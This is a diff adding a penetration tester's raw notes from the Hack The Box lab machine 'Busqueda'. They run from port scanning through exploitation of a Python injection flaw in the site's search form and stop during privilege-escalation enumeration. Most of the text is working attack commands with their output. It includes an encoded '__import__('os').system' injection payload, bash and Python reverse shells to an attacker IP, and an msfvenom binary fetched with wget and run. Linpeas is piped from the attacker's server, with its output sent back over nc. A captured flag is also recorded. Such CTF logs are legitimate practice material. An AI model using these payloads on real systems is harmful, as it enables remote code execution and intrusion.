@@ -1,0 +1,442 @@
+2023-04-11 23:27:15 CDT -- START TIME
+
+### Busqueda ###
+----------------------------------------
+
+|================================================================
+- Name: busqueda
+- IP Address: 10.10.11.208
+- OS: Ubuntu 22.04.2 LTS /x64
+- Notes: 
+
+//CREDS:
+//
+
+//Flags:
+//User:		07288dcbef44744f62a910d0b123ab42
+//System:
+
+|================================================================
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// nmap --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// SCAN
+ip=10.10.11.208
+
+2023-04-11 23:32:53 CDT -- 
+ports=$(nmap -e tun0 -Pn -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+
+echo $ports
+//22,80
+
+2023-04-11 23:34:01 CDT -- 
+nmap -e tun0 -Pn -A -sC -p$ports $ip -oN tcp.nmap
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
+|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Did not follow redirect to http://searcher.htb/
+Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+# UDP scan
+2023-04-11 23:35:14 CDT -- 
+sudo nmap -e tun0 -Pn -sU --top-ports 100 $ip -oN udp.nmap
+
+PORT   STATE         SERVICE
+68/udp open|filtered dhcpc
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+-- add /etc/hosts file entries --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+# add /etc/hosts entry nix
+sudo sh -c "echo '10.10.11.208\t searcher.htb' >> /etc/hosts"
+cat /etc/hosts
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+-- feroxbuster --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+# feroxbuster use (-k = Disable TLS verification; -e = do directory listing when possible; -q = quiet)
+2023-04-11 23:40:54 CDT -- 
+feroxbuster -u http://searcher.htb/ -o ferox.out
+
+405 http://searcher.htb/search
+200 http://searcher.htb/
+403 http://searcher.htb/server-status
+
+2023-04-11 23:56:00 CDT -- 
+//Testing w/ extensions
+feroxbuster -u http://searcher.htb/ -x php,txt,html,htm,aspx -o ferox.out
+//No changes, just took longer
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// nikto -- 
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// scan website
+2023-04-12 00:01:38 CDT -- 
+nikto -h http://searcher.htb/ -o nikto_scan.txt
+//Nothing
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//Burp:
+http://searcher.htb/
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+//Info: Search anything with Searcher! The capabilities range from social media platforms to encyclopedias, to Q&A sites, and to much more. Choose from our huge collection of search engines, including YouTube, Google, DuckDuckGo, eBay and various other platforms.
+//To start:
+1. Simply select the engine you want to use.
+2. Type the query you want to be searched.
+3. Finally, hit the "Search" button to submit the query.
+
+//If you want to get redirected automatically, you can tick the check box. Then you will be automatically redirected to the selected engine with the results of the query you searched for. Otherwise, you will get the URL of your search, which you can use however you wish.
+
+//Without Redirect Checked
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+//Request
+POST /search HTTP/1.1
+Host: searcher.htb
+Origin: http://searcher.htb
+Referer: http://searcher.htb/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+engine=Google&query=hacking
+
+//Response
+HTTP/1.1 200 OK
+Server: Werkzeug/2.1.2 Python/3.10.6
+Content-Type: text/html; charset=utf-8
+Vary: Accept-Encoding
+Connection: close
+
+https://www.google.com/search?q=hacking
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+//With Redirect Checked
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+//Request
+POST /search HTTP/1.1
+Host: searcher.htb
+Origin: http://searcher.htb
+Referer: http://searcher.htb/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+engine=Google&query=hacking&auto_redirect=
+
+//Response
+HTTP/1.1 302 FOUND
+Server: Werkzeug/2.1.2 Python/3.10.6
+Location: https://www.google.com/search?q=hacking
+Connection: close
+
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="https://www.google.com/search?q=hacking">https://www.google.com/search?q=hacking</a>. If not, click the link.
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+//NOTE: The server is running: Werkzeug/2.1.2 Python/3.10.6.
+
+// Testing Python Command Exeuction w/ BURP
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+__import__('os').system('id') 		//Nothing
+'__import__('os').system('id')'		//Nothing
+
+//Adding Plus make it look more like a query
+'+__import__('os').system('id')+'	//Nothing
+//Percent Encode (+=%2b)
+'%2b__import__('os').system('id')%2b'
+
+uid=1000(svc) gid=1000(svc) groups=1000(svc)
+//SUCCESS!!
+
+//Full %URL Encode:
+%27%2B__import__%28%27os%27%29.system%28%27id%27%29%2B%27
+
+//Generate Curl Command from BURP
+curl -i -s -k -X $'POST' -H $'Host: searcher.htb' -H $'Content-Length: 57' -H $'Cache-Control: max-age=0' -H $'Upgrade-Insecure-Requests: 1' -H $'Origin: http://searcher.htb' -H $'Content-Type: application/x-www-form-urlencoded' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Referer: http://searcher.htb/' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'id\')%2b\'' $'http://searcher.htb/search'
+
+//Removing Extra info:
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'id\')%2b\''
+
+uid=1000(svc) gid=1000(svc) groups=1000(svc)
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// RevShell (svc)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+2023-04-12 01:48:17 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'pwd\')%2b\''
+
+/var/www/app
+
+2023-04-12 01:49:13 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'ls -lah\')%2b\''
+
+drwxr-xr-x 4 www-data www-data 4.0K Apr  3 14:32 .
+drwxr-xr-x 4 root     root     4.0K Apr  4 16:02 ..
+-rw-r--r-- 1 www-data www-data 1.1K Dec  1 14:22 app.py
+drwxr-xr-x 8 www-data www-data 4.0K Apr 11 23:25 .git
+drwxr-xr-x 2 www-data www-data 4.0K Dec  1 14:35 templates
+
+2023-04-12 02:36:24 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'hostname\')%2b\''
+
+busqueda
+
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'cat /etc/*elease\')%2b\''
+
+PRETTY_NAME="Ubuntu 22.04.2 LTS"
+
+
+2023-04-12 02:01:25 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'cat /etc/passwd\')%2b\''
+
+root:x:0:0:root:/root:/bin/bash
+svc:x:1000:1000:svc:/home/svc:/bin/bash
+
+//Generate RevShell
+# Payload: /bin/bash -i >& /dev/tcp/10.10.16.13/443 0>&1
+# Encoded: %2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.13%2F443%200%3E%261
+
+//Start Listener
+sudo rlwrap -cAr nc -lvnp 443
+
+//Connect
+2023-04-12 02:05:15 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'/bin/bash -i >& /dev/tcp/10.10.16.13/443 0>&1\')%2b\''
+//FAIL
+
+2023-04-12 02:17:22 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.13%2F443%200%3E%261\')%2b\''
+//FAIL
+
+2023-04-12 02:09:26 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'python%20-V\')%2b\''
+//Nothing
+
+2023-04-12 02:09:44 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'python3%20-V\')%2b\''
+
+Python 3.10.6
+
+2023-04-12 02:28:14 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'export%20RHOST%3D%2210.10.16.13%22%3Bexport%20RPORT%3D443%3Bpython3%20-c%20%27import%20sys%2Csocket%2Cos%2Cpty%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28os.getenv%28%22RHOST%22%29%2Cint%28os.getenv%28%22RPORT%22%29%29%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cfd%29%20for%20fd%20in%20%280%2C1%2C2%29%5D%3Bpty.spawn%28%22%2Fbin%2Fbash%22%29%27\')%2b\''
+//FAIL
+
+//Not able to use shell callbacks, trying a binary
+
+// generate msfvenom binary
+2023-04-12 02:40:32 CDT -- 
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.13 LPORT=443 -f elf -o reverse.elf
+
+//Start Python webserver
+sudo python -m http.server 443
+
+2023-04-12 02:43:35 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'which wget\')%2b\''
+
+/usr/bin/wget
+
+2023-04-12 02:46:49 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'wget http://10.10.16.13:6969/reverse.elf -O /tmp/reverse.elf \')%2b\''
+
+2023-04-12 02:48:07 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'ls -lah /tmp/reverse.elf\')%2b\''
+-rw-r--r-- 1 svc svc 194 Apr 12 07:41 /tmp/reverse.elf
+
+2023-04-12 02:51:03 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'chmod %2bx /tmp/reverse.elf\')%2b\''
+
+2023-04-12 02:51:05 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'ls -lah /tmp/reverse.elf\')%2b\''
+-rwxr-xr-x 1 svc svc 194 Apr 12 07:41 /tmp/reverse.elf
+
+2023-04-12 02:54:00 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'/tmp/reverse.elf\')%2b\''
+
+//SUCCESS
+
+id
+uid=1000(svc) gid=1000(svc) groups=1000(svc)
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//ENUM (svc)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+# python method
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+2023-04-12 02:57:59 CDT -- 
+ls /home
+svc
+
+ls -lah /home/svc/
+
+2023-04-12 02:59:05 CDT -- 
+cat /home/svc/user.txt
+//07288dcbef44744f62a910d0b123ab42
+
+2023-04-12 03:06:18 CDT -- 
+netstat -pant
+
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*         LISTEN      -                   
+tcp        0      0 127.0.0.1:222           0.0.0.0:*         LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*         LISTEN      -                   
+tcp        0      0 127.0.0.1:42767         0.0.0.0:*         LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*         LISTEN      -                   
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*         LISTEN      -                   
+tcp        0      0 127.0.0.1:5000          0.0.0.0:*         LISTEN      1639/python3
+
+//3306 = MySQL
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// privesc --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// install peass
+sudo apt install -y peass
+
+// get a copy of linpeas shell script or binary
+cp /usr/share/peass/linpeas/linpeas.sh .
+
+2023-04-12 03:14:50 CDT -- 
+which curl
+/usr/bin/curl
+
+// download, execute from memory, & save output on kali
+  // kali term1
+sudo python3 -m http.server 6969
+  // kali term2
+nc -lvnp 443 | tee linpeas.out
+  // target
+2023-04-12 03:16:05 CDT -- 
+curl 10.10.16.13:6969/linpeas.sh | sh | nc 10.10.16.13 443
+
+╔══════════╣ CVEs Check
+Potentially Vulnerable to CVE-2022-0847
+Potentially Vulnerable to CVE-2022-2588
+
+╔══════════╣ Executing Linux Exploit Suggester
+[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
+[+] [CVE-2022-2586] nft_object UAF
+[+] [CVE-2022-0847] DirtyPipe
+[+] [CVE-2021-4034] PwnKit
+[+] [CVE-2021-3156] sudo Baron Samedit
+[+] [CVE-2021-3156] sudo Baron Samedit 2
+[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
+[+] [CVE-2017-5618] setuid screen v4.5.0 LPE
+
+╔══════════╣ Container related tools present
+/usr/bin/docker                                                                               /usr/sbin/runc
+
+╔══════════╣ Container details                                                                                                     
+═╣ Is this a container? ........... No                                                                                             
+═╣ Any running containers? ........ No
+
+svc         1639  4.0  Ssl  Apr11  21:37 python3 /var/www/app/app.py
+
+╔══════════╣ Interfaces
+br-c954bf22b8b2: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
+        inet 172.20.0.1  netmask 255.255.0.0  broadcast 172.20.255.255
+br-cbf2c5ce8e95: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 172.19.0.1  netmask 255.255.0.0  broadcast 172.19.255.255
+br-fba5a3e31476: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
+        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255
+docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
+        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500                                                                                       
+        inet 10.10.11.208  netmask 255.255.254.0  broadcast 10.10.11.255
+
+╔══════════╣ Users with console
+root:x:0:0:root:/root:/bin/bash                                                               svc:x:1000:1000:svc:/home/svc:/bin/bash
+
+╔══════════╣ MySQL version
+mysql  Ver 8.0.32-0ubuntu0.22.04.2 for Linux on x86_64 ((Ubuntu)) 
+
+╔══════════╣ Searching mysql credentials and exec
+Found lib_mysqludf_sys.so:                                                                                                                       
+If you can login in MySQL you can execute commands doing: SELECT sys_eval('id');
+
+══╣ PHP exec extensions
+ServerName searcher.htb
+        ServerAdmin admin@searcher.htb
+        ProxyPass / http://127.0.0.1:5000/
+ServerName gitea.searcher.htb
+        ServerAdmin admin@searcher.htb
+        ProxyPass / http://127.0.0.1:3000/
+
+//.git files/dirs
+-rw-rw-r-- 1 svc svc 76 Apr  3 08:58 /home/svc/.gitconfig
+drwxr-x--- 8 root root 4096 Apr  3 15:04 /opt/scripts/.git
+drwxr-xr-x 8 www-data www-data 4096 Apr 11 23:25 /var/www/app/.git
+
+╔══════════╣ Checking if runc is available
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/runc-privilege-escalation                                                   
+runc was found in /usr/sbin/runc, you may be able to escalate privileges with it
+
+
+
+2023-04-12 03:43:27 CDT -- 
+cat /home/svc/.gitconfig
+[user]
+        email = cody@searcher.htb
+        name = cody
+[core]
+        hooksPath = no-hooks
+
+2023-04-12 03:45:41 CDT -- 
+ls -lah /var/www/app/.git
+total 52K
+drwxr-xr-x 8 www-data www-data 4.0K Apr 11 23:25 .
+drwxr-xr-x 4 www-data www-data 4.0K Apr  3 14:32 ..
+-rw-r--r-- 1 www-data www-data   15 Dec  1 14:35 COMMIT_EDITMSG
+-rw-r--r-- 1 www-data www-data   21 Dec  1 14:35 HEAD
+drwxr-xr-x 2 www-data www-data 4.0K Dec  1 14:35 branches
+-rw-r--r-- 1 www-data www-data  294 Dec  1 14:35 config
+-rw-r--r-- 1 www-data www-data   73 Dec  1 14:35 description
+drwxr-xr-x 2 www-data www-data 4.0K Dec  1 14:35 hooks
+-rw-r--r-- 1 root     root      259 Apr  3 15:09 index
+drwxr-xr-x 2 www-data www-data 4.0K Dec  1 14:35 info
+drwxr-xr-x 3 www-data www-data 4.0K Dec  1 14:35 logs
+drwxr-xr-x 9 www-data www-data 4.0K Dec  1 14:35 objects
+drwxr-xr-x 5 www-data www-data 4.0K Dec  1 14:35 refs
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+
